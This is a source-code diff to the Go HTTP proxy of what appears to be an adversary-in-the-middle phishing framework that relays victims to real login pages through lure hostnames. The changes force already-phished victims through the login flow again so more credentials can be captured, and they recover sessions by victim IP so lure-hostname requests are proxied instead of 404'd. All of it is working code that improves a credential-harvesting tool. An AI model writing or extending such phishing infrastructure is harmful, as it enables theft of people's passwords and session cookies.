@@ -345,13 +345,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                     if err == nil {
                         ps.Index, ok = p.sids[sc.Value]
                         if ok {
-                            create_session = false
-                            ps.SessionId = sc.Value
-                            p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
-                            // Restore lure hostname for sessions that used a custom subdomain
-                            if s, ok2 := p.sessions[ps.SessionId]; ok2 && s.PhishLure != nil {
-                                if s.PhishLure.Hostname != "" && pl != nil && s.PhishLure.Hostname != pl.GetLandingPhishHost() {
-                                    ps.LureHostname = s.PhishLure.Hostname
+                            // If a lure URL triggered this request and the existing session is
+                            // already done (credentials captured), force a fresh session so the
+                            // victim goes through the login flow again.
+                            if l != nil {
+                                if s, exists := p.sessions[sc.Value]; exists && s.IsDone {
+                                    ok = false
+                                    create_session = true
+                                }
+                            }
+                            if ok {
+                                create_session = false
+                                ps.SessionId = sc.Value
+                                p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
+                                // Restore lure hostname for sessions that used a custom subdomain
+                                if s, ok2 := p.sessions[ps.SessionId]; ok2 && s.PhishLure != nil {
+                                    if s.PhishLure.Hostname != "" && pl != nil && s.PhishLure.Hostname != pl.GetLandingPhishHost() {
+                                        ps.LureHostname = s.PhishLure.Hostname
+                                    }
                                 }
                             }
                         } else {
@@ -658,18 +669,31 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                 }
 
                 if p.cfg.IsLureHostnameValid(req.Host) {
-                    if ps.SessionId != "" {
-                        // Valid session on custom lure hostname: proxy as landing host so
-                        // Microsoft pages are fetched correctly, but record the lure hostname
-                        // so the response handler rewrites Location/cookies back to it.
+                    lureHost := req.Host
+                    remapToLanding := func() {
                         if ps.LureHostname == "" {
-                            ps.LureHostname = req.Host
+                            ps.LureHostname = lureHost
                         }
                         if pl != nil {
                             if landingHost := pl.GetLandingPhishHost(); landingHost != "" {
                                 req.Host = landingHost
                             }
                         }
+                    }
+                    if ps.SessionId != "" {
+                        // Valid session on custom lure hostname: proxy as landing host so
+                        // upstream pages are fetched correctly, but record the lure hostname
+                        // so the response handler rewrites Location/cookies back to it.
+                        remapToLanding()
+                    } else if recoveredSid, recovered := p.getSessionIdByIP(remote_addr, lureHost); recovered {
+                        // Session exists for this IP (created when the lure was first triggered)
+                        // but the session cookie has not been set in the browser yet.
+                        // Recover the session so the request is proxied, not 404'd.
+                        ps.SessionId = recoveredSid
+                        if idx, ok2 := p.sids[recoveredSid]; ok2 {
+                            ps.Index = idx
+                        }
+                        remapToLanding()
                     } else {
                         log.Debug("lure hostname detected - returning 404 for request: %s", req_url)
                         resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
